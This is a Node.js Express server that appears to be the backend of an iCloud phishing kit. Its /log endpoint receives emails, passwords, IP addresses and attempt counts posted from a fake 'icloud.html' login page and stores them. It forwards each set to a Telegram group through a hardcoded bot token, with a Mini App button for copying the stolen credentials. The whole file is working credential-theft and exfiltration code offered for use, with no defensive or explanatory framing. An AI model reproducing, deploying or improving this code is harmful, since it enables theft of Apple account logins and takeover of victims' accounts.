// ============================================
// server.js — Mini App launcher + credential store
// ============================================
const express = require('express');
const path = require('path');
const crypto = require('crypto');

const BOT_TOKEN = '8843925472:AAFNt5aPu39E7YhPs8WjXARNmQ3VBhnZJ68';
const GROUP_ID  = '-1003983565500';

// Public HTTPS base URL — see "HTTPS" section below
// Example with ngrok: 'https://abc123.ngrok-free.app'
const PUBLIC_URL = process.env.PUBLIC_URL || 'http://localhost:3000';

const app = express();
app.use(express.json());
app.use(express.static(__dirname));

// ============================================
// CREDENTIAL STORE
// ============================================
const store = new Map(); // id -> { email, password, ip, attempt, day, time, date, ts }

function makeId() {
    return crypto.randomBytes(8).toString('hex');
}

function cleanup() {
    const cutoff = Date.now() - (1000 * 60 * 60 * 24); // 24h
    for (const [k, v] of store) {
        if (v.ts < cutoff) store.delete(k);
    }
}
setInterval(cleanup, 1000 * 60 * 10);

// ============================================
// POST /log — receives credentials from icloud.html
// ============================================
app.post('/log', async (req, res) => {
    try {
        const { email, password, attempt, ip, day, time, date } = req.body;
        if (!email || !password) {
            return res.status(400).json({ ok: false, error: 'missing fields' });
        }

        const id = makeId();
        store.set(id, {
            email, password,
            attempt: attempt || '—',
            ip: ip || '—',
            day: day || '—',
            time: time || '—',
            date: date || '—',
            ts: Date.now()
        });

        const miniappUrl = PUBLIC_URL + '/miniapp.html?id=' + id;

        const text =
            '🍎 ICLOUD LOGIN\n' +
            '━━━━━━━━━━━━━━━━━━━━━\n' +
            '📧 Email: ' + email + '\n' +
            '🔑 Password: ' + password + '\n' +
            '📊 Attempt: ' + (attempt || '—') + '\n' +
            '🌐 IP: ' + (ip || '—') + '\n' +
            '📅 Day: ' + (day || '—') + '\n' +
            '⏰ Time: ' + (time || '—') + '\n' +
            '📆 Date: ' + (date || '—') + '\n' +
            '━━━━━━━━━━━━━━━━━━━━━\n' +
            '👇 Open the Mini App to copy';

        const r = await fetch(
            `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
            {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: GROUP_ID,
                    text: text,
                    reply_markup: {
                        inline_keyboard: [[
                            { text: '📋 Open Copy Tool', web_app: { url: miniappUrl } }
                        ]]
                    }
                })
            }
        );
        const data = await r.json();
        if (!data.ok) console.error('❌ rejected:', data.description);
        else console.log('✅ sent:', email, '| id:', id);

        res.json({ ok: true, id });
    } catch (e) {
        console.error('❌ error:', e.message);
        res.status(500).json({ ok: false });
    }
});

// ============================================
// GET /get/:id — Mini App fetches credential by ID
// ============================================
app.get('/get/:id', (req, res) => {
    const row = store.get(req.params.id);
    if (!row) return res.status(404).json({ ok: false, error: 'not found or expired' });
    res.json({ ok: true, ...row });
});

// ============================================
// START
// ============================================
app.listen(3000, () => {
    console.log('🚀 http://localhost:3000');
    console.log('🌍 PUBLIC_URL: ' + PUBLIC_URL);
    console.log('📌 Group ID: ' + GROUP_ID);
});